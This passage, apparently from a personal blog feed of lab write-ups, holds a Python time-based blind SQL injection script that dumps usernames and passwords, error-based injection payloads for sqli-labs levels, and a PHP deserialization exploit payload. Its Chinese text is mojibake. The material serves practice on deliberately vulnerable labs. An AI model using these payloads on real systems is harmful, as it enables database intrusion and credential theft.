</span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload3 = <span class=\"string\">&quot;1&#x27; and if(substring(database(),&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload3,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">db = db + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database is &quot;</span> + <span class=\"built_in\">str</span>(db))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">TablesTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">100</span> <span class=\"comment\"># é¢„æµ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨åç§°æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">tname = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload4 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))&gt;&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload4,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># æœ¬è„šæœ¬æ ¹æ®GETå‹æ³¨å…¥ç¼–å†™ï¼Œé‡åˆ°POSTå‹å¯ä¿®æ”¹æ”¹è¡Œæ–¹æ³•å’Œå‚æ•°ï¼Œå…¶ä»–æ‰€æœ‰å‡½æ•°ä¸­åŒæ ·  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload5 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))=&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload5,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in current database contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload6 = <span class=\"string\">&quot;1&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload6,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">tname = tname + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in current database is &quot;</span> + <span class=\"built_in\">str</span>(tname))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ColumnsTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">200</span> <span class=\"comment\"># é¢„æµ‹æŸä¸ªè¡¨æ‰€æœ‰åˆ—åç§°æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">cname = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload7 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;)))&gt;&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload7,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># æœ¬è„šæœ¬æ ¹æ®GETå‹æ³¨å…¥ç¼–å†™ï¼Œé‡åˆ°POSTå‹å¯ä¿®æ”¹æ”¹è¡Œæ–¹æ³•å’Œå‚æ•°ï¼Œå…¶ä»–æ‰€æœ‰å‡½æ•°ä¸­åŒæ ·  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload8 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;)))=&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload8,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload9 = <span class=\"string\">&quot;1&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;),&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload9,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">cname = cname + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table is &quot;</span> + <span class=\"built_in\">str</span>(cname))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ContentTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">200</span> <span class=\"comment\"># é¢„æµ‹æœŸæœ›è·å–çš„æ•°æ®çš„æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">content = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload10 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(concat(username,&#x27;^&#x27;,password)) from users)))&gt;&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload10,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># æœ¬è„šæœ¬æ ¹æ®GETå‹æ³¨å…¥ç¼–å†™ï¼Œé‡åˆ°POSTå‹å¯ä¿®æ”¹æ”¹è¡Œæ–¹æ³•å’Œå‚æ•°ï¼Œå…¶ä»–æ‰€æœ‰å‡½æ•°ä¸­åŒæ ·  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload11 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(concat(username,&#x27;^&#x27;,password)) from users)))=&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload11,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload12 = <span class=\"string\">&quot;1&#x27; and if(substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload12,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">content = content + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content is &quot;</span> + <span class=\"built_in\">str</span>(content))  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#CurrentDatabaseTime()  </span></span><br><span class=\"line\"><span class=\"comment\">#TablesTime()  </span></span><br><span class=\"line\">ColumnsTime()  </span><br><span class=\"line\"><span class=\"comment\">#ContentTime()</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> less-10</h2>\n<p>é—­åˆæ¡ä»¶å˜æˆ 1â€™â€“+ çš„æ—¶é—´ç›²æ³¨</p>\n<h2 id=\"less11\"><a class=\"markdownIt-Anchor\" href=\"#less11\">#</a> less11</h2>\n<p>è¾“å…¥ï¼Ÿid=1 å‘ç° url åœ°å€æ²¡æœ‰æ˜¾ç¤ºï¼ŒæŠ“åŒ…å‘ç° post æ–¹å¼<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n åˆ¤æ–­å­—ç¬¦å‹<br>\næ¥ä¸‹æ¥ç”¨åŸºæœ¬çš„ union æ³¨å…¥å°±æ¬§å…‹</p>\n<h2 id=\"less12\"><a class=\"markdownIt-Anchor\" href=\"#less12\">#</a> less12</h2>\n<p>&quot;) å‹ï¼Œè”åˆæ³¨å…¥</p>\n<h2 id=\"less13\"><a class=\"markdownIt-Anchor\" href=\"#less13\">#</a> less13</h2>\n<p>)â€™ # åŠ ä¸ŠæŠ¥é”™æ³¨å…¥</p>\n<h2 id=\"less14\"><a class=\"markdownIt-Anchor\" href=\"#less14\">#</a> less14</h2>\n<p>&quot;# åŠ ä¸ŠæŠ¥é”™æ³¨å…¥</p>\n<h2 id=\"less15\"><a class=\"markdownIt-Anchor\" href=\"#less15\">#</a> less15</h2>\n<p>ä¸æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯åªèƒ½ç›²æ³¨<br>\nå•å¼•å·å­—ç¬¦å‹çš„å¸ƒå°”ç›²æ³¨:<br>\n1â€™ --+</p>\n<h2 id=\"less16\"><a class=\"markdownIt-Anchor\" href=\"#less16\">#</a> less16</h2>\n<p>åŒå¼•å·å­—ç¬¦å‹åŠ æ‹¬å·çš„ç›²æ³¨<br>\n 1&quot;) --+</p>\n<h2 id=\"less17\"><a class=\"markdownIt-Anchor\" href=\"#less17\">#</a> less17</h2>\n<p>1. æ³¨å…¥ç‚¹åœ¨ password æ é‡Œï¼Œå•å¼•å·å­—ç¬¦åŠ æŠ¥é”™æ³¨å…¥<br>\n 2. å…ˆæŠ“åŒ…ï¼Œcopy to file, ç”¨ sqlmap å·¥å…·<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r è·¯å¾„</p>\n<h2 id=\"less18\"><a class=\"markdownIt-Anchor\" href=\"#less18\">#</a> less18</h2>\n<p>æ³¨å…¥ç‚¹åœ¨ user-agent, ä¸”ç”¨æˆ·åå¯†ç å¿…é¡»æ­£ç¡®<br>\næ³¨æ„ï¼šé—­åˆä¹‹å‰çš„éƒ¨åˆ†å¿…é¡»ä¸ºç©ºï¼Œå¾ˆæ¶å¿ƒ<br>\nâ€™ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) orâ€™</p>\n<p>æœ€å:<br>\nâ€™ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) orâ€™</p>\n<h2 id=\"less19\"><a class=\"markdownIt-Anchor\" href=\"#less19\">#</a> less19</h2>\n<p>ä¸ 18 ä¸€æ ·ï¼Œæ³¨å…¥ç‚¹åœ¨ referer</p>\n<h2 id=\"less20\"><a class=\"markdownIt-Anchor\" href=\"#less20\">#</a> less20</h2>\n<p>è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼ŒæŠ“åˆ°ä¸¤ä¸ªåŒ…ï¼Œget åŒ…é‡Œæœ‰ cookie, æ³¨å…¥ç‚¹åœ¨ cookie</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/unserialize-labs/",
            "url": "https://hq185187.github.io/2023/04/27/unserialize-labs/",
            "title": "Unserialize-labs",
            "date_published": "2023-04-27T15:48:42.874Z",
            "content_html": "<h1 id=\"task6-unserialize-labs\"><a class=\"markdownIt-Anchor\" href=\"#task6-unserialize-labs\">#</a> task6 unserialize-labs</h1>\n<h2 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SoFun</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;file)) &#123;</span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strchr</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"string\">&quot;\\\\&quot;</span>) === <span class=\"literal\">false</span> &amp;&amp; <span class=\"title function_ invoke__\">strchr</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"string\">&#x27;/&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>) . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$this</span>-&gt;file);</span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">else</span></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Wrong filename.&#x27;</span>);</span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>&lt;!--key in flag1.php--&gt;</span><br></pre></td></tr></table></figure>\n<p>strchr å‡½æ•°ï¼šæœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°<br>\n PHP dirname () å‡½æ•°æ˜¯è¿”å›æ–‡ä»¶è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚å®ƒç»™å‡ºä¸€ä¸ªåŒ…å«æœ‰æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶çš„å…¨è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œè¿”å›å»æ‰æ–‡ä»¶ååçš„ç›®å½•å<br>\n eg <code>dirname(/user/bin)ç»“æœæ˜¯/user</code> <br>\n ç»•è¿‡ wake_up æ–¹æ³•ï¼šå½“å±æ€§ä¸ªæ•°å¤§äºå®é™…ä¸ªæ•°</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SoFun</span></span>&#123;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$file</span>=<span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">SoFun</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">åˆ«å¿˜äº†åŠ \\<span class=\"number\">00</span>,sæ˜¾ç¤ºçš„ä½æ•°æ˜¯<span class=\"number\">7</span>,</span><br></pre></td></tr></table></figure>\n<p>payload: <code>?tryhackme=O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:9:&quot;flag1.php&quot;;&#125;</code> <br>\n<mark> æ³¨æ„</mark><br>\nä¿æŠ¤å‡½æ•° (protected) ååºåˆ—åŒ–å‰è¦åœ¨ <code>*</code>  å·¦å³åŠ  <code>\\00</code>  å¹¶ä¸”å° s å˜å¤§ S (ä¸ç”¨å˜å€¼ï¼Œå˜å±æ€§å°±å¯ä»¥äº†), ä¹Ÿå¯ä»¥å°† <code>\\00å˜æˆ%00(0çš„url)</code> ,</p>\n<h2 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag2.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span>&#123;</span><br><span class=\"line\">Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class=\"line\">Â  Â <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[oc]:\\d+:/i&#x27;</span>, <span class=\"variable\">$a</span>))&#123;</span><br><span class=\"line\">Â  Â  Â  Â  